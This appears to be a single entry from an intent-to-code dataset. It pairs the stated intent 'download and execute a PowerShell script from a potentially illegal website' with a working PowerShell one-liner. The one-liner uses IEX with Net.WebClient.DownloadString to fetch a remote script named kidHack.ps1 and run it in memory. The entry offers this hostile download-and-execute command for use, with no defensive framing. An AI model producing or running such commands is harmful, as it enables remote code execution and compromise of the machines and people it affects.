# Natural language intent:
# Download and execute a PowerShell script from a potentially illegal website.

IEX (New-Object Net.WebClient).DownloadString('http://illegal-website.com/kidHack.ps1')
